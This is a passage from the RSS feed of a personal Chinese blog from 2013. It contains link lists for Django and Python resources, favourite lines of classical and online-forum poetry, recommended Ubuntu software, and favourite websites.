&lt;li&gt;&lt;a href="https://github.com/stephenmcd/mezzanine"&gt;mezzanine&lt;/a&gt; 一个开源的内容管理平台，包括web版本和移动版本&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/maraujop/django-crispy-forms"&gt;django-crispy-forms&lt;/a&gt;    官网介绍'The best way to have Django DRY forms'&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/nathanborror/django-basic-apps"&gt;django-basic-apps&lt;/a&gt; 一些基础app,可当脚手架用&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bread-and-pepper/django-userena"&gt;django-userena&lt;/a&gt; 功能完善的注册模块，支持用户信息维护，头像上传，自带了个站内消息模块，很适合sns类网站&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Fantomas42/django-blog-zinnia"&gt;django-blog-zinnia&lt;/a&gt;  博客系统，界面清爽，源码清晰&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lambdafu/django-south"&gt;django-south&lt;/a&gt;  south能够检测对models的更改并同步到数据库.这篇博客不错，&lt;a href="alexliyu.blog.163.com/blog/static/16275449620126239949478/"&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/divio/django-shop"&gt;django-shop&lt;/a&gt; 基本的网店系统&lt;/li&gt;
&lt;li&gt;几个国内的:&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yueyoum/django-social-login"&gt;django-social-login&lt;/a&gt;用第三方帐号登录网站，我使用的过程中有几个问题，是版本更新没有跟上导致的，期待作者的更新&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yueyoum/social-oauth"&gt;social-oauth&lt;/a&gt; 专注于中国大陆开放了OAuth2认证的网站&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/duoshuo/duoshuo-python-sdk"&gt;duoshuo-python-sdk&lt;/a&gt;多说Python SDK，社会化评论系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://haoluobo.com/trac/wiki/Django"&gt;django资源汇总&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/15555/"&gt;10个实用的Django建议&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/holbrook/archive/2012/02/25/2368231.html"&gt;项目结构最佳实践&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.djangosites.org/"&gt;djangosites&lt;/a&gt;  上面有不少带有源码的项目&lt;/li&gt;
&lt;li&gt;&lt;a href="http://django-china.cn"&gt;django-china&lt;/a&gt;   国内较好的django论坛（ps:国内算得上django论坛的就貌似只有这个。。）&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 08 Aug 2013 00:00:00 +0000</pubDate><guid>tag:,2013-08-08:django-links.html</guid><category>django</category></item><item><title>喜欢的一些句子（摘自古代）</title><link>/poet-old.html</link><description>&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;同心一人去，坐觉长安空。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;桃李春风一杯酒，江湖夜雨十年灯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 08 Aug 2013 00:00:00 +0000</pubDate><guid>tag:,2013-08-08:poet-old.html</guid><category>诗词</category></item><item><title>喜欢的一些句子（摘自各论坛）</title><link>/poet-web.html</link><description>&lt;h3&gt;孟依依&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;难臻无欲无求境，况是多愁多病身   ---自述&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;斜檐隔雨藏燕子，小巷飞花来故人   ---伤别离（今韵）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;今夜空余满楼月，他乡已老少年心   ---同上&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;梦中犹有半轮月，一样清辉似少年   ---叠韵二十四日夜梦故人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;无非多事来借伞，总为钟情方惑人   ---白蛇&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;春衫尚是旧针线，记否缝衣灯下人。   ---许仙（词韵&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;剩将花径留桃李，以待崔郎题竹扉  ---望复&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我来犹一瞬，花谢已三回         ---上网三年感怀有寄&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;劝我少为愁极语，因君珍重岁寒时    ---次韵酬远近&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;范蠡重来定惆怅，若耶不遇浣纱人。---咏洗衣机&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;好去桥边临野水，宜同西子浣纱看    --桃花七首其六&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但凭几壶龙井，消磨半个春天   ----临江仙 江南行七首之为人赋西湖湖畔居茶室&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不知人瘦损，只道月依然。  ---临江仙 嫦娥 次韵月依然&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;三径未宜延俗客，新词惟是赠蛾眉。从今有贴不须回。---浣溪沙 戏赠慕容诗学辞版&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;圣人善事先言器，试与明朝更置刀。    ----鹧鸪天 厨下作&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;非雾非花劳梦想，不言不语最关心。便从相遇到如今。  ---浣溪沙 谀十三&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;鹏翼已抟云水去，梅枝又著雪霜开。可能相忆到尘埃。  --- 浣溪沙 有怀&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;天北天南今避路，春风春水昔同舟     ---浣溪沙 有怀&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;相识霏霏惟碎雪，打春灯。   ---山花子 元夕忆童年思亡母&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;妖精的锁骨&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;提笔因怀花已落，披衣恐负月微凉。  ---浣溪沙 想你的夜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从此诗词应可废，他年生死且由之     ---浣溪沙 怀人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;于家于国两无用,种豆种花一等闲 ---蒙君错爱小眉弯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我下楼时天下雨，可能于我有深哀      --- 牙疼有感 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;坐等不知天已暮,灰姑娘对水晶鞋        ---某年某月某一天&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;遂趁身闲即趁兴,愿逢花好更逢君        ---看······桃花······&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;或离三站地,聊共一城春                       --- 看······桃花······&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;练车如练剑，伤我亦伤人。               —妖在菊斋的马甲的签名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当时拼一死 ，只为近尘埃                     ---妖在菊斋的签名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;醉卧长安&lt;/h3&gt;
&lt;p&gt;waiting...&lt;/p&gt;
&lt;h3&gt;落花风雨&lt;/h3&gt;
&lt;p&gt;waiting...&lt;/p&gt;
&lt;h3&gt;发初覆眉&lt;/h3&gt;
&lt;p&gt;waiting...&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 08 Aug 2013 00:00:00 +0000</pubDate><guid>tag:,2013-08-08:poet-web.html</guid><category>诗词</category></item><item><title>python的一些资源链接</title><link>/python-links.html</link><description>&lt;h3&gt;整理一下zim中python的一些资源链接，多而杂，各个角落里都有，慢慢整理吧，会不断更新～&lt;/h3&gt;
&lt;h3&gt;教程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;learning python 我的入门书&lt;/li&gt;
&lt;li&gt;programming python  只有英文版的&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ppurl.com"&gt;皮皮书屋&lt;/a&gt; 在里面搜索一下python,有不少高质量的电子书（免费下载）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.douban.com/note/134971609/"&gt;PEP8 Python编码规范整理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.pythontab.com/html/2012/pythonjichu_1220/10.html"&gt;详解python2 和 python3的区别&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/yuxc/archive/2011/03/24/2029786.html"&gt;unicode&lt;/a&gt;  如果遇到编码问题，中文问题，可以看看&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jsome.net/blog/2010/06/11/start-to-use-virtualenv"&gt;virtualenv入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://matplotlib.org/gallery.html"&gt;科学计算&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 08 Aug 2013 00:00:00 +0000</pubDate><guid>tag:,2013-08-08:python-links.html</guid><category>python</category></item><item><title>软件推荐</title><link>/ubuntusoft.html</link><description>&lt;h3&gt;以下是我常用的一些软件～&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;zim&lt;/code&gt; 桌面wiki，跨平台，一直用它来整理知识&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ReTest&lt;/code&gt;   markdown编辑器，可实时预览&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sublime test&lt;/code&gt; 极其性感的文本编辑器，用它浏览代码很是赏心悦目&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IPython&lt;/code&gt; IPython 是 Python 的原生交互式 shell 的增强版&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Notebook&lt;/code&gt; 在web浏览器上使用ipython,极其适合做科学计算，能保存你的练习代码，让你的工作可以累加，不必为保存实验数据头疼&lt;/li&gt;
&lt;li&gt;&lt;code&gt;zsh&lt;/code&gt; The last shell you’ll ever need! 交互性极其好，&lt;a href="https://github.com/robbyrussell/oh-my-zsh"&gt;懒人请点击&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ulipad&lt;/code&gt;  Python ide，limodou出品,跨平台,基于wxPython，我也用它写django&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Dia&lt;/code&gt;  开放源码的流程图软件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fcitx&lt;/code&gt;  Linux操作系统中使用的中文输入法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GIMP&lt;/code&gt; photoshop开源替代方案&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Docky&lt;/code&gt;  Docky可以被视为Mac OS X的Dock的最佳克隆&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Avant&lt;/code&gt;  与Docky类似的东西，感觉用着更顺手&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Synapse&lt;/code&gt; 搜索系统里的任何东西，速度很快&lt;/li&gt;
&lt;li&gt;&lt;code&gt;新立得&lt;/code&gt;   包管理工具apt的图形化前端,适合新手&lt;/li&gt;
&lt;li&gt;&lt;code&gt;freeming&lt;/code&gt;  思维导图软件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;chrome&lt;/code&gt;  ubuntu自带的是firefox,chrome的js调试功能让人爱不释手&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Filezilla&lt;/code&gt;  ftp客户端，带有sftp功能，极好用&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Pencil&lt;/code&gt;  网站快速原型&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Virtualbox&lt;/code&gt;  开源虚拟机软件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Wireshark&lt;/code&gt;  据说是神器，不大会用，兵器谱上排名唯一超过Metasploit的&lt;/li&gt;
&lt;li&gt;&lt;code&gt;evernote&lt;/code&gt;  linux下只有everpad，印象笔记是我最重要的一个工具，没用之一&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;说到软件，推荐两个很不错的网站&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;小众软件&lt;/code&gt;  &lt;a href="http://www.appinn.com/"&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;异次元&lt;/code&gt;  &lt;a href="http://www.iplaysoft.com/"&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 08 Aug 2013 00:00:00 +0000</pubDate><guid>tag:,2013-08-08:ubuntusoft.html</guid><category>ubuntu</category></item><item><title>常去的一些网站</title><link>/web-share.html</link><description>&lt;p&gt;与大家分享～&lt;/p&gt;
&lt;p&gt;互联网上有趣的网站很多，无趣的更多，沙里淘金是体力活，多数时候淘出的都是沙子，俺把自己喜欢的和常去的网站都罗列出来，独乐乐不如众乐乐～&lt;/p&gt;
&lt;h3&gt;文艺类：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.douban.com"&gt;豆瓣&lt;/a&gt; 这个不用多说。文艺青年和技术帝们都值得拥有。什么？你身兼两者，那还犹豫神马，赶紧注册吧 ps：&lt;a href="http://www.douban.com/people/59672556/"&gt;my douban&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.juzhai.com"&gt;菊斋&lt;/a&gt; 很隐逸的一个诗词论坛，这里民风淳朴，藏龙卧虎，路人甲乙丙丁可能分别是醉卧长安，落花风雨，孟依依 and 发初覆眉  ps:你还没读过《月出集》么，下回不要和我说你喜欢过诗词^_^&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.5sing.com"&gt;5sing&lt;/a&gt; 如果你喜欢古风音乐，这里很适合你;如果你喜欢原创音乐，这里很适合你;什么？！你还喜欢作词作曲？！好吧，你才是这里的主人。。不会作曲的表示很受伤。ps：我真的很喜欢这两个妹子的声音:   &lt;a href="#todo"&gt;樱哚哚&lt;/a&gt;
   &lt;a href="#todo"&gt;樱佩佩&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;技术类:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com"&gt;知乎&lt;/a&gt; 知乎必须排在第一位，真实而精致的的网络问答社区&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.v2ex.com"&gt;v2ex&lt;/a&gt; 创意工作者们的社区&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.gitbub.com"&gt;github&lt;/a&gt;  ps：&lt;a href="http://www.github.com/wwj718"&gt;my github&lt;/a&gt;  you can follow me^_^   我们千军万马又各自节点着&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.oschina.net"&gt;oschina&lt;/a&gt; 专注于开源技术的社区&lt;/li&gt;
&lt;li&gt;&lt;a href="http://hi.42qu.com/"&gt;42区&lt;/a&gt; “42区”是一个基于个人技能的C2C交易平台&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 08 Aug 2013 00:00:00 +0000</pubDate><guid>tag:,2013-08-08:web-share.html</guid><category>web</category></item></channel></rss>